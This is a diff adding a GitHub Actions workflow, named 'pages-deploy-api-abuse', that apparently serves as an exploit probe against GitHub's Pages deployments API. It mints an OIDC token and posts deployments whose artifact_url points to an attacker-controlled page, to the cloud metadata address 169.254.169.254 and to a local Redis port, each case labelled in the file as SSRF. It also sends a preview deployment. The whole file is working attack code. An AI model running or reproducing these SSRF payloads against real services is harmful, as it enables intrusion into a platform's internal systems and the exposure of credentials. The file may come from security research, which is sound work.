@@ -1,0 +1,62 @@
+name: pages-deploy-api-abuse
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'mode'
+        required: true
+        default: 'artifact_url'
+        type: string
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: github-pages
+    steps:
+      - id: oidc
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const core = require('@actions/core');
+            const id_token = await core.getIDToken('https://github.com/madakara private pages'.trim());
+            core.setSecret(id_token);
+            const fs = require('fs');
+            fs.writeFileSync('/tmp/oidc.txt', id_token);
+            core.info('got oidc len=' + id_token.length);
+      - name: call deployments API
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          MODE: ${{ inputs.mode }}
+        run: |
+          OIDC=$(cat /tmp/oidc.txt)
+          REPO=madaraninja1337/madaraninja1337.github.io
+          case "$MODE" in
+            artifact_url)
+              echo "== artifact_url = attacker-controlled URL =="
+              gh api -X POST /repos/$REPO/pages/deployments --input - <<JSON
+          {"pages_build_version":"pwn-$MODE","artifact_url":"https://madaraninja1337.github.io/canary/1791280213.html","oidc_token":"$OIDC"}
+          JSON
+              ;;
+            metadata)
+              echo "== artifact_url = cloud metadata SSRF =="
+              gh api -X POST /repos/$REPO/pages/deployments --input - <<JSON
+          {"pages_build_version":"pwn-$MODE","artifact_url":"http://169.254.169.254/latest/meta-data/","oidc_token":"$OIDC"}
+          JSON
+              ;;
+            localhost)
+              echo "== artifact_url = localhost SSRF =="
+              gh api -X POST /repos/$REPO/pages/deployments --input - <<JSON
+          {"pages_build_version":"pwn-$MODE","artifact_url":"http://127.0.0.1:6379/INFO","oidc_token":"$OIDC"}
+          JSON
+              ;;
+            preview)
+              echo "== preview deployment =="
+              AID=$(gh api /repos/$REPO/actions/runs/${{ github.run_id }}/artifacts -q '.artifacts[0].id')
+              gh api -X POST /repos/$REPO/pages/deployments --input - <<JSON
+          {"pages_build_version":"preview-$MODE","artifact_id":$AID,"preview":true,"oidc_token":"$OIDC"}
+          JSON
+              ;;
+          esac
